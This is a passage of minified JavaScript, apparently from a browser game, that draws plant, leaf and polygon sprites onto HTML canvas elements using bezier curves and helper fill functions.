                    n.bezierCurveTo(296.0000305175781 * e, 260.5852355957031 * e, 264.0000305175781 * e, 256.5852355957031 * e, 220.00003051757812 * e, 236.58523559570312 * e),
                    n.bezierCurveTo(233.00003051757812 * e, 266.5852355957031 * e, 232.00003051757812 * e, 279.5852355957031 * e, 231.00003051757812 * e, 295.5852355957031 * e),
                    n.bezierCurveTo(222.00003051757812 * e, 297.5852355957031 * e, 222.00003051757812 * e, 297.5852355957031 * e, 213.00003051757812 * e, 299.5852355957031 * e),
                    n.bezierCurveTo(219.50003051757812 * e, 308.0852355957031 * e, 219.50003051757812 * e, 308.0852355957031 * e, 226.00003051757812 * e, 316.5852355957031 * e),
                    n.bezierCurveTo(223.00003051757812 * e, 344.5852355957031 * e, 216.00003051757812 * e, 350.5852355957031 * e, 209.00003051757812 * e, 363.5852355957031 * e),
                    n.bezierCurveTo(154.00003051757812 * e, 318.5852355957031 * e, 156.00003051757812 * e, 268.5852355957031 * e, 160.00003051757812 * e, 238.58523559570312 * e),
                    n.bezierCurveTo(135.00003051757812 * e, 268.5852355957031 * e, 125.00003051757812 * e, 267.5852355957031 * e, 112.00003051757812 * e, 272.5852355957031 * e),
                    n.bezierCurveTo(104.50003051757812 * e, 266.5852355957031 * e, 104.50003051757812 * e, 266.5852355957031 * e, 97.00003051757812 * e, 260.5852355957031 * e),
                    n.bezierCurveTo(93.00003051757812 * e, 271.0852355957031 * e, 93.00003051757812 * e, 271.0852355957031 * e, 89.00003051757812 * e, 281.5852355957031 * e),
                    n.bezierCurveTo(66.00003051757812 * e, 288.5852355957031 * e, 59.000030517578125 * e, 288.5852355957031 * e, 39.000030517578125 * e, 285.5852355957031 * e),
                    n.bezierCurveTo(56.000030517578125 * e, 216.58523559570312 * e, 91.00003051757812 * e, 204.58523559570312 * e, 129.00003051757812 * e, 189.58523559570312 * e),
                    n.bezierCurveTo(90.00003051757812 * e, 176.58523559570312 * e, 89.00003051757812 * e, 173.58523559570312 * e, 79.00003051757812 * e, 166.58523559570312 * e),
                    n.bezierCurveTo(82.00003051757812 * e, 155.08523559570312 * e, 82.00003051757812 * e, 155.08523559570312 * e, 85.00003051757812 * e, 143.58523559570312 * e),
                    n.bezierCurveTo(75.50003051757812 * e, 147.58523559570312 * e, 75.50003051757812 * e, 147.58523559570312 * e, 66.00003051757812 * e, 151.58523559570312 * e),
                    n.bezierCurveTo(44.000030517578125 * e, 133.58523559570312 * e, 41.000030517578125 * e, 124.58523559570312 * e, 34.000030517578125 * e, 102.58523559570312 * e),
                    n.bezierCurveTo(100.00003051757812 * e, 81.58523559570312 * e, 134.00003051757812 * e, 118.58523559570312 * e, 150.00003051757812 * e, 128.58523559570312 * e),
                    n.bezierCurveTo(144.00003051757812 * e, 102.58523559570312 * e, 147.00003051757812 * e, 90.58523559570312 * e, 150.00003051757812 * e, 80.58523559570312 * e),
                    n.bezierCurveTo(159.50003051757812 * e, 79.08523559570312 * e, 159.50003051757812 * e, 79.08523559570312 * e, 169.00003051757812 * e, 77.58523559570312 * e),
                    n.bezierCurveTo(163.00003051757812 * e, 72.58523559570312 * e, 163.00003051757812 * e, 72.58523559570312 * e, 157.00003051757812 * e, 67.58523559570312 * e),
                    n.bezierCurveTo(162.00003051757812 * e, 42.585235595703125 * e, 169.00003051757812 * e, 29.585235595703125 * e, 182.00003051757812 * e, 14.585235595703125 * e),
                    n.bezierCurveTo(219.00003051757812 * e, 48.585235595703125 * e, 222.00003051757812 * e, 92.58523559570312 * e, 218.00003051757812 * e, 112.58523559570312 * e),
                    n.bezierCurveTo(239.00003051757812 * e, 95.58523559570312 * e, 242.00003051757812 * e, 97.58523559570312 * e, 249.00003051757812 * e, 94.58523559570312 * e),
                    n.bezierCurveTo(255.00003051757812 * e, 103.08523559570312 * e, 255.00003051757812 * e, 103.08523559570312 * e, 261.0000305175781 * e, 111.58523559570312 * e),
                    n.bezierCurveTo(261.5000305175781 * e, 99.58523559570312 * e, 261.5000305175781 * e, 99.58523559570312 * e, 262.0000305175781 * e, 87.58523559570312 * e),
                    n.bezierCurveTo(282.0000305175781 * e, 77.58523559570312 * e, 301.0000305175781 * e, 74.58523559570312 * e, 314.0000305175781 * e, 76.58523559570312 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    n.translate(-15 * e, -15 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(313.0000305175781 * e, 76.58523559570312 * e),
                    n.bezierCurveTo(308.0000305175781 * e, 130.58523559570312 * e, 279.0000305175781 * e, 158.58523559570312 * e, 254.00003051757812 * e, 175.58523559570312 * e),
                    n.bezierCurveTo(287.0000305175781 * e, 182.58523559570312 * e, 274.0000305175781 * e, 181.08523559570312 * e, 294.0000305175781 * e, 186.58523559570312 * e),
                    n.bezierCurveTo(293.5000305175781 * e, 196.08523559570312 * e, 293.5000305175781 * e, 196.08523559570312 * e, 293.0000305175781 * e, 205.58523559570312 * e),
                    n.bezierCurveTo(304.0000305175781 * e, 201.08523559570312 * e, 304.0000305175781 * e, 201.08523559570312 * e, 315.0000305175781 * e, 196.58523559570312 * e),
                    n.bezierCurveTo(350.0000305175781 * e, 219.58523559570312 * e, 343.0000305175781 * e, 221.58523559570312 * e, 351.0000305175781 * e, 230.58523559570312 * e),
                    n.bezierCurveTo(296.0000305175781 * e, 260.5852355957031 * e, 264.0000305175781 * e, 256.5852355957031 * e, 220.00003051757812 * e, 236.58523559570312 * e),
                    n.bezierCurveTo(233.00003051757812 * e, 266.5852355957031 * e, 232.00003051757812 * e, 279.5852355957031 * e, 231.00003051757812 * e, 295.5852355957031 * e),
                    n.bezierCurveTo(222.00003051757812 * e, 297.5852355957031 * e, 222.00003051757812 * e, 297.5852355957031 * e, 213.00003051757812 * e, 299.5852355957031 * e),
                    n.bezierCurveTo(219.50003051757812 * e, 308.0852355957031 * e, 219.50003051757812 * e, 308.0852355957031 * e, 226.00003051757812 * e, 316.5852355957031 * e),
                    n.bezierCurveTo(223.00003051757812 * e, 344.5852355957031 * e, 216.00003051757812 * e, 350.5852355957031 * e, 209.00003051757812 * e, 363.5852355957031 * e),
                    n.bezierCurveTo(154.00003051757812 * e, 318.5852355957031 * e, 156.00003051757812 * e, 268.5852355957031 * e, 160.00003051757812 * e, 238.58523559570312 * e),
                    n.bezierCurveTo(135.00003051757812 * e, 268.5852355957031 * e, 125.00003051757812 * e, 267.5852355957031 * e, 112.00003051757812 * e, 272.5852355957031 * e),
                    n.bezierCurveTo(104.50003051757812 * e, 266.5852355957031 * e, 104.50003051757812 * e, 266.5852355957031 * e, 97.00003051757812 * e, 260.5852355957031 * e),
                    n.bezierCurveTo(93.00003051757812 * e, 271.0852355957031 * e, 93.00003051757812 * e, 271.0852355957031 * e, 89.00003051757812 * e, 281.5852355957031 * e),
                    n.bezierCurveTo(66.00003051757812 * e, 288.5852355957031 * e, 59.000030517578125 * e, 288.5852355957031 * e, 39.000030517578125 * e, 285.5852355957031 * e),
                    n.bezierCurveTo(56.000030517578125 * e, 216.58523559570312 * e, 91.00003051757812 * e, 204.58523559570312 * e, 129.00003051757812 * e, 189.58523559570312 * e),
                    n.bezierCurveTo(90.00003051757812 * e, 176.58523559570312 * e, 89.00003051757812 * e, 173.58523559570312 * e, 79.00003051757812 * e, 166.58523559570312 * e),
                    n.bezierCurveTo(82.00003051757812 * e, 155.08523559570312 * e, 82.00003051757812 * e, 155.08523559570312 * e, 85.00003051757812 * e, 143.58523559570312 * e),
                    n.bezierCurveTo(75.50003051757812 * e, 147.58523559570312 * e, 75.50003051757812 * e, 147.58523559570312 * e, 66.00003051757812 * e, 151.58523559570312 * e),
                    n.bezierCurveTo(44.000030517578125 * e, 133.58523559570312 * e, 41.000030517578125 * e, 124.58523559570312 * e, 34.000030517578125 * e, 102.58523559570312 * e),
                    n.bezierCurveTo(100.00003051757812 * e, 81.58523559570312 * e, 134.00003051757812 * e, 118.58523559570312 * e, 150.00003051757812 * e, 128.58523559570312 * e),
                    n.bezierCurveTo(144.00003051757812 * e, 102.58523559570312 * e, 147.00003051757812 * e, 90.58523559570312 * e, 150.00003051757812 * e, 80.58523559570312 * e),
                    n.bezierCurveTo(159.50003051757812 * e, 79.08523559570312 * e, 159.50003051757812 * e, 79.08523559570312 * e, 169.00003051757812 * e, 77.58523559570312 * e),
                    n.bezierCurveTo(163.00003051757812 * e, 72.58523559570312 * e, 163.00003051757812 * e, 72.58523559570312 * e, 157.00003051757812 * e, 67.58523559570312 * e),
                    n.bezierCurveTo(162.00003051757812 * e, 42.585235595703125 * e, 169.00003051757812 * e, 29.585235595703125 * e, 182.00003051757812 * e, 14.585235595703125 * e),
                    n.bezierCurveTo(219.00003051757812 * e, 48.585235595703125 * e, 222.00003051757812 * e, 92.58523559570312 * e, 218.00003051757812 * e, 112.58523559570312 * e),
                    n.bezierCurveTo(239.00003051757812 * e, 95.58523559570312 * e, 242.00003051757812 * e, 97.58523559570312 * e, 249.00003051757812 * e, 94.58523559570312 * e),
                    n.bezierCurveTo(255.00003051757812 * e, 103.08523559570312 * e, 255.00003051757812 * e, 103.08523559570312 * e, 261.0000305175781 * e, 111.58523559570312 * e),
                    n.bezierCurveTo(261.5000305175781 * e, 99.58523559570312 * e, 261.5000305175781 * e, 99.58523559570312 * e, 262.0000305175781 * e, 87.58523559570312 * e),
                    n.bezierCurveTo(282.0000305175781 * e, 77.58523559570312 * e, 301.0000305175781 * e, 74.58523559570312 * e, 314.0000305175781 * e, 76.58523559570312 * e),
                    n.closePath(),
                    he(n, t[1], t[2], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(186.00003051757812 * e, 192.94886779785156 * e),
                    n.bezierCurveTo(185.00003051757812 * e, 66.94886779785156 * e, 184.50003051757812 * e, 104.94886779785156 * e, 183.00003051757812 * e, 16.948867797851562 * e),
                    n.bezierCurveTo(216.00003051757812 * e, 47.94886779785156 * e, 219.00003051757812 * e, 80.94886779785156 * e, 218.00003051757812 * e, 113.94886779785156 * e),
                    n.bezierCurveTo(209.00003051757812 * e, 165.94886779785156 * e, 200.00003051757812 * e, 176.94886779785156 * e, 189.00003051757812 * e, 192.94886779785156 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 2 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(190.00003051757812 * e, 191.94886779785156 * e),
                    n.bezierCurveTo(207.00003051757812 * e, 348.94886779785156 * e, 205.00003051757812 * e, 323.94886779785156 * e, 209.00003051757812 * e, 358.94886779785156 * e),
                    n.bezierCurveTo(171.00003051757812 * e, 334.94886779785156 * e, 167.00003051757812 * e, 302.94886779785156 * e, 161.00003051757812 * e, 268.94886779785156 * e),
                    n.bezierCurveTo(160.00003051757812 * e, 218.94886779785156 * e, 181.00003051757812 * e, 191.94886779785156 * e, 189.00003051757812 * e, 186.94886779785156 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 2 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(194.00003051757812 * e, 195.94886779785156 * e),
                    n.bezierCurveTo(116.00003051757812 * e, 150.94886779785156 * e, 116.00003051757812 * e, 150.94886779785156 * e, 38.000030517578125 * e, 105.94886779785156 * e),
                    n.bezierCurveTo(67.00003051757812 * e, 90.94886779785156 * e, 96.00003051757812 * e, 99.94886779785156 * e, 123.00003051757812 * e, 111.94886779785156 * e),
                    n.bezierCurveTo(183.00003051757812 * e, 152.94886779785156 * e, 179.00003051757812 * e, 180.94886779785156 * e, 193.00003051757812 * e, 194.94886779785156 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 2 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(189.00003051757812 * e, 190.94886779785156 * e),
                    n.bezierCurveTo(250.00003051757812 * e, 133.94886779785156 * e, 311.0000305175781 * e, 78.94886779785156 * e, 311.0000305175781 * e, 76.94886779785156 * e),
                    n.bezierCurveTo(306.0000305175781 * e, 127.94886779785156 * e, 283.0000305175781 * e, 148.94886779785156 * e, 261.0000305175781 * e, 166.94886779785156 * e),
                    n.bezierCurveTo(220.00003051757812 * e, 197.94886779785156 * e, 191.00003051757812 * e, 194.94886779785156 * e, 189.00003051757812 * e, 195.94886779785156 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 2 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(189.00003051757812 * e, 194.94886779785156 * e),
                    n.bezierCurveTo(268.5000305175781 * e, 211.94886779785156 * e, 268.5000305175781 * e, 211.94886779785156 * e, 348.0000305175781 * e, 228.94886779785156 * e),
                    n.bezierCurveTo(316.0000305175781 * e, 247.94886779785156 * e, 298.0000305175781 * e, 256.94886779785156 * e, 250.00003051757812 * e, 246.94886779785156 * e),
                    n.bezierCurveTo(197.00003051757812 * e, 229.94886779785156 * e, 189.00003051757812 * e, 202.94886779785156 * e, 188.00003051757812 * e, 199.94886779785156 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 2 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(192.00003051757812 * e, 191.94886779785156 * e),
                    n.bezierCurveTo(116.50003051757812 * e, 238.44886779785156 * e, 116.50003051757812 * e, 238.44886779785156 * e, 41.000030517578125 * e, 284.94886779785156 * e),
                    n.bezierCurveTo(49.000030517578125 * e, 252.94886779785156 * e, 56.000030517578125 * e, 242.94886779785156 * e, 80.00003051757812 * e, 215.94886779785156 * e),
                    n.bezierCurveTo(125.00003051757812 * e, 181.94886779785156 * e, 174.00003051757812 * e, 183.94886779785156 * e, 192.00003051757812 * e, 191.94886779785156 * e),
                    n.closePath(),
                    he(n, t[3], t[3], 2 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(313.0000305175781 * e, 76.58523559570312 * e),
                    n.bezierCurveTo(308.0000305175781 * e, 130.58523559570312 * e, 279.0000305175781 * e, 158.58523559570312 * e, 254.00003051757812 * e, 175.58523559570312 * e),
                    n.bezierCurveTo(287.0000305175781 * e, 182.58523559570312 * e, 274.0000305175781 * e, 181.08523559570312 * e, 294.0000305175781 * e, 186.58523559570312 * e),
                    n.bezierCurveTo(293.5000305175781 * e, 196.08523559570312 * e, 293.5000305175781 * e, 196.08523559570312 * e, 293.0000305175781 * e, 205.58523559570312 * e),
                    n.bezierCurveTo(304.0000305175781 * e, 201.08523559570312 * e, 304.0000305175781 * e, 201.08523559570312 * e, 315.0000305175781 * e, 196.58523559570312 * e),
                    n.bezierCurveTo(350.0000305175781 * e, 219.58523559570312 * e, 343.0000305175781 * e, 221.58523559570312 * e, 351.0000305175781 * e, 230.58523559570312 * e),
                    n.bezierCurveTo(296.0000305175781 * e, 260.5852355957031 * e, 264.0000305175781 * e, 256.5852355957031 * e, 220.00003051757812 * e, 236.58523559570312 * e),
                    n.bezierCurveTo(233.00003051757812 * e, 266.5852355957031 * e, 232.00003051757812 * e, 279.5852355957031 * e, 231.00003051757812 * e, 295.5852355957031 * e),
                    n.bezierCurveTo(222.00003051757812 * e, 297.5852355957031 * e, 222.00003051757812 * e, 297.5852355957031 * e, 213.00003051757812 * e, 299.5852355957031 * e),
                    n.bezierCurveTo(219.50003051757812 * e, 308.0852355957031 * e, 219.50003051757812 * e, 308.0852355957031 * e, 226.00003051757812 * e, 316.5852355957031 * e),
                    n.bezierCurveTo(223.00003051757812 * e, 344.5852355957031 * e, 216.00003051757812 * e, 350.5852355957031 * e, 209.00003051757812 * e, 363.5852355957031 * e),
                    n.bezierCurveTo(154.00003051757812 * e, 318.5852355957031 * e, 156.00003051757812 * e, 268.5852355957031 * e, 160.00003051757812 * e, 238.58523559570312 * e),
                    n.bezierCurveTo(135.00003051757812 * e, 268.5852355957031 * e, 125.00003051757812 * e, 267.5852355957031 * e, 112.00003051757812 * e, 272.5852355957031 * e),
                    n.bezierCurveTo(104.50003051757812 * e, 266.5852355957031 * e, 104.50003051757812 * e, 266.5852355957031 * e, 97.00003051757812 * e, 260.5852355957031 * e),
                    n.bezierCurveTo(93.00003051757812 * e, 271.0852355957031 * e, 93.00003051757812 * e, 271.0852355957031 * e, 89.00003051757812 * e, 281.5852355957031 * e),
                    n.bezierCurveTo(66.00003051757812 * e, 288.5852355957031 * e, 59.000030517578125 * e, 288.5852355957031 * e, 39.000030517578125 * e, 285.5852355957031 * e),
                    n.bezierCurveTo(56.000030517578125 * e, 216.58523559570312 * e, 91.00003051757812 * e, 204.58523559570312 * e, 129.00003051757812 * e, 189.58523559570312 * e),
                    n.bezierCurveTo(90.00003051757812 * e, 176.58523559570312 * e, 89.00003051757812 * e, 173.58523559570312 * e, 79.00003051757812 * e, 166.58523559570312 * e),
                    n.bezierCurveTo(82.00003051757812 * e, 155.08523559570312 * e, 82.00003051757812 * e, 155.08523559570312 * e, 85.00003051757812 * e, 143.58523559570312 * e),
                    n.bezierCurveTo(75.50003051757812 * e, 147.58523559570312 * e, 75.50003051757812 * e, 147.58523559570312 * e, 66.00003051757812 * e, 151.58523559570312 * e),
                    n.bezierCurveTo(44.000030517578125 * e, 133.58523559570312 * e, 41.000030517578125 * e, 124.58523559570312 * e, 34.000030517578125 * e, 102.58523559570312 * e),
                    n.bezierCurveTo(100.00003051757812 * e, 81.58523559570312 * e, 134.00003051757812 * e, 118.58523559570312 * e, 150.00003051757812 * e, 128.58523559570312 * e),
                    n.bezierCurveTo(144.00003051757812 * e, 102.58523559570312 * e, 147.00003051757812 * e, 90.58523559570312 * e, 150.00003051757812 * e, 80.58523559570312 * e),
                    n.bezierCurveTo(159.50003051757812 * e, 79.08523559570312 * e, 159.50003051757812 * e, 79.08523559570312 * e, 169.00003051757812 * e, 77.58523559570312 * e),
                    n.bezierCurveTo(163.00003051757812 * e, 72.58523559570312 * e, 163.00003051757812 * e, 72.58523559570312 * e, 157.00003051757812 * e, 67.58523559570312 * e),
                    n.bezierCurveTo(162.00003051757812 * e, 42.585235595703125 * e, 169.00003051757812 * e, 29.585235595703125 * e, 182.00003051757812 * e, 14.585235595703125 * e),
                    n.bezierCurveTo(219.00003051757812 * e, 48.585235595703125 * e, 222.00003051757812 * e, 92.58523559570312 * e, 218.00003051757812 * e, 112.58523559570312 * e),
                    n.bezierCurveTo(239.00003051757812 * e, 95.58523559570312 * e, 242.00003051757812 * e, 97.58523559570312 * e, 249.00003051757812 * e, 94.58523559570312 * e),
                    n.bezierCurveTo(255.00003051757812 * e, 103.08523559570312 * e, 255.00003051757812 * e, 103.08523559570312 * e, 261.0000305175781 * e, 111.58523559570312 * e),
                    n.bezierCurveTo(261.5000305175781 * e, 99.58523559570312 * e, 261.5000305175781 * e, 99.58523559570312 * e, 262.0000305175781 * e, 87.58523559570312 * e),
                    n.bezierCurveTo(282.0000305175781 * e, 77.58523559570312 * e, 301.0000305175781 * e, 74.58523559570312 * e, 314.0000305175781 * e, 76.58523559570312 * e),
                    n.closePath(),
                    he(n, void 0, t[2], 4 * e),
                    i
            }
            function ft(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 248 * e,
                    n.height = 128 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(137 * e, 7 * e),
                    r.bezierCurveTo(169 * e, 14 * e, 212 * e, 9 * e, 241 * e, 5 * e),
                    r.bezierCurveTo(211 * e, 63 * e, 158 * e, 92 * e, 103 * e, 109 * e),
                    r.bezierCurveTo(73 * e, 126 * e, 54 * e, 124 * e, 6 * e, 99 * e),
                    r.bezierCurveTo(82 * e, 63 * e, 113 * e, 35 * e, 137 * e, 8 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 14 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(73 * e, 124 * e),
                    r.bezierCurveTo(111 * e, 126 * e, 162 * e, 97 * e, 203 * e, 61 * e),
                    r.bezierCurveTo(156 * e, 98 * e, 131 * e, 106 * e, 105 * e, 109 * e),
                    r.bezierCurveTo(99 * e, 121 * e, 87 * e, 124 * e, 72 * e, 124 * e),
                    r.closePath(),
                    he(r, i[2], i[3], +e),
                    n
            }
            function Lt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 130 * e,
                    n.height = 148 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(65 * e, 85 * e),
                    r.rotate(1.4),
                    A(r, 7, 60 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(65 * e, 74 * e),
                    r.rotate(1.4),
                    A(r, 7, 60 * e, 10 * e),
                    he(r, i[1], i[2], 4),
                    r.rotate(.64),
                    A(r, 7, 40 * e, 10 * e),
                    he(r, i[3], i[4], 4),
                    r.rotate(.12),
                    A(r, 7, 23 * e, 5 * e),
                    r.restore(),
                    he(r, i[5]),
                    n
            }
            function Gt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 125 * e,
                    n.height = 139 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(63 * e, 79 * e),
                    r.rotate(1),
                    A(r, 8, 60 * e, 10 * e),
                    he(r, i[0]),
                    r.restore(),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(63 * e, 69 * e),
                    r.rotate(1),
                    A(r, 8, 60 * e, 10 * e),
                    he(r, i[1], i[2], 4),
                    r.rotate(.56),
                    A(r, 8, 40 * e, 10 * e),
                    he(r, i[3], i[4], 4),
                    r.rotate(.28),
                    A(r, 8, 28 * e, 8 * e),
                    he(r, i[5]),
                    r.restore(),
                    n
            }
            function yt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 90 * e,
                    n.height = 101 * e,
                    r.translate(0 * e, 5 * e),
                    0 === Ze && (r.globalAlpha = t ? .5 : 1,
                        ke(r, 44 * e, 55 * e, 41 * e),
                        he(r, i[0])),
                    r.globalAlpha = 1,
                    ke(r, 44 * e, 45 * e, 41 * e),
                    he(r, i[1], i[2], 4 * e),
                    ke(r, 44 * e, 45 * e, 31 * e),
                    he(r, i[3]),
                    r.save(),
                    r.translate(45 * e, 45 * e),
                    Ve(r, -9 * e, -25.5 * e, 18 * e, 51 * e, 30 * e),
                    r.restore(),
                    he(r, i[4], i[4], 2 * e),
                    r.save(),
                    r.translate(45 * e, 45 * e),
                    Ve(r, -26 * e, -9 * e, 52 * e, 18 * e, 30 * e),
                    r.restore(),
                    he(r, i[4], i[4], 2 * e),
                    ke(r, 45 * e, 29 * e, 7 * e),
                    he(r, i[5]),
                    ke(r, 45 * e, 61 * e, 7 * e),
                    he(r, i[5]),
                    ke(r, 28 * e, 45 * e, 7 * e),
                    he(r, i[5]),
                    ke(r, 62 * e, 45 * e, 7 * e),
                    he(r, i[5]),
                    n
            }
            function Ht(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 90 * e,
                    n.height = 98 * e,
                    r.translate(0, 4 * e),
                    0 === Ze && (r.globalAlpha = t ? .5 : 1,
                        r.save(),
                        r.translate(44 * e, 50 * e),
                        r.rotate(1.4),
                        A(r, 7, 41 * e, 10 * e),
                        r.restore(),
                        he(r, i[0])),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(44 * e, 44 * e),
                    r.rotate(1.4),
                    A(r, 7, 41 * e, 10 * e),
                    he(r, i[1], i[2], 4 * e),
                    A(r, 7, 35 * e, 10 * e),
                    he(r, i[3], i[4], 4 * e),
                    A(r, 7, 23 * e, 5 * e),
                    r.restore(),
                    he(r, i[5]),
                    r.save(),
                    r.translate(45 * e, 45 * e),
                    r.rotate(0),
                    Ve(r, -9 * e, -25.5 * e, 18 * e, 51 * e, 30 * e),
                    r.restore(),
                    he(r, i[4], i[4], 2 * e),
                    r.save(),
                    r.translate(45 * e, 45 * e),
                    r.rotate(0),
                    Ve(r, -26 * e, -9 * e, 52 * e, 18 * e, 30 * e),
                    r.restore(),
                    he(r, i[4], i[4], 2 * e),
                    ke(r, 45 * e, 29 * e, 7 * e),
                    he(r, i[5]),
                    ke(r, 45 * e, 61 * e, 7 * e),
                    he(r, i[5]),
                    ke(r, 28 * e, 45 * e, 7 * e),
                    he(r, i[5]),
                    ke(r, 62 * e, 45 * e, 7 * e),
                    he(r, i[5]),
                    n
            }
            function Pt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 90 * e,
                    n.height = 98 * e,
                    r.translate(0, 4 * e),
                    0 === Ze && (r.globalAlpha = t ? .5 : 1,
                        r.save(),
                        r.translate(44 * e, 50 * e),
                        r.rotate(1),
                        A(r, 8, 41 * e, 10 * e),
                        he(r, i[0]),
                        r.restore()),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(44 * e, 44 * e),
                    r.rotate(1),
                    A(r, 8, 41 * e, 10 * e),
                    he(r, i[1], i[2], 4 * e),
                    r.rotate(.56),
                    A(r, 8, 33 * e, 10 * e),
                    he(r, i[3], i[4], 4 * e),
                    r.rotate(.28),
                    A(r, 8, 24 * e, 8 * e),
                    he(r, i[5]),
                    r.restore(),
                    r.save(),
                    r.translate(45 * e, 45 * e),
                    r.rotate(0),
                    Ve(r, -9 * e, -25.5 * e, 18 * e, 51 * e, 30 * e),
                    r.restore(),
                    he(r, i[4], i[4], 2 * e),
                    r.save(),
                    r.translate(45 * e, 45 * e),
                    r.rotate(0),
                    Ve(r, -26 * e, -9 * e, 52 * e, 18 * e, 30 * e),
                    r.restore(),
                    he(r, i[4], i[4], 2 * e),
                    ke(r, 45 * e, 29 * e, 7 * e),
                    he(r, i[5]),
                    ke(r, 45 * e, 61 * e, 7 * e),
                    he(r, i[5]),
                    ke(r, 28 * e, 45 * e, 7 * e),
                    he(r, i[5]),
                    ke(r, 62 * e, 45 * e, 7 * e),
                    he(r, i[5]),
                    n
            }
            function zt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 300 * e,
                    n.height = 300 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(150 * e, 160 * e),
                    r.rotate(6.28),
                    A(r, 6, 146 * e, 30 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(150 * e, 150 * e),
                    r.rotate(6.28),
                    A(r, 6, 146 * e, 30 * e),
                    r.restore(),
                    he(r, i[1], i[2], 8 * e),
                    r.save(),
                    r.translate(150 * e, 150 * e),
                    r.rotate(0),
                    A(r, 6, 105 * e, 30 * e),
                    r.restore(),
                    he(r, i[3], i[3], 8 * e),
                    r.save(),
                    r.translate(150 * e, 150 * e),
                    r.rotate(0),
                    A(r, 6, 66 * e, 30 * e),
                    r.restore(),
                    he(r, i[4], i[2], 8 * e),
                    r.save(),
                    r.translate(150 * e, 150 * e),
                    r.rotate(0),
                    A(r, 6, 31 * e, 30 * e),
                    r.restore(),
                    he(r, i[5], i[6], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(150 * e, 207 * e),
                    r.bezierCurveTo(150 * e, 151 * e, 150 * e, 101 * e, 150 * e, 94 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(118 * e, 100 * e),
                    r.bezierCurveTo(118 * e, 205 * e, 118 * e, 207 * e, 118 * e, 200 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(183 * e, 100 * e),
                    r.bezierCurveTo(183 * e, 203 * e, 183 * e, 203 * e, 183 * e, 200 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 8 * e),
                    n
            }
            function Bt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 300 * e,
                    n.height = 300 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(150 * e, 160 * e),
                    r.rotate(6.28),
                    A(r, 6, 146 * e, 30 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(150 * e, 150 * e),
                    r.rotate(6.28),
                    A(r, 6, 146 * e, 30 * e),
                    r.restore(),
                    he(r, i[1], i[2], 8 * e),
                    r.save(),
                    r.translate(150 * e, 150 * e),
                    r.rotate(0),
                    A(r, 6, 105 * e, 30 * e),
                    r.restore(),
                    he(r, i[3], i[3], 8 * e),
                    r.save(),
                    r.translate(150 * e, 150 * e),
                    r.rotate(0),
                    A(r, 6, 66 * e, 30 * e),
                    r.restore(),
                    he(r, i[4], i[2], 8 * e),
                    r.save(),
                    r.translate(131 * e, 116 * e),
                    A(r, 7, 17 * e, 8 * e),
                    r.restore(),
                    he(r, i[6]),
                    r.save(),
                    r.translate(163 * e, 168 * e),
                    A(r, 7, 25 * e, 8 * e),
                    r.restore(),
                    he(r, i[6]),
                    r.save(),
                    r.translate(117 * e, 151 * e),
                    A(r, 7, 11 * e, 8 * e),
                    r.restore(),
                    he(r, i[6]),
                    r.save(),
                    r.translate(167 * e, 122 * e),
                    A(r, 7, 12 * e, 8 * e),
                    r.restore(),
                    he(r, i[6]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(150 * e, 207 * e),
                    r.bezierCurveTo(150 * e, 151 * e, 150 * e, 101 * e, 150 * e, 94 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 8 * e),
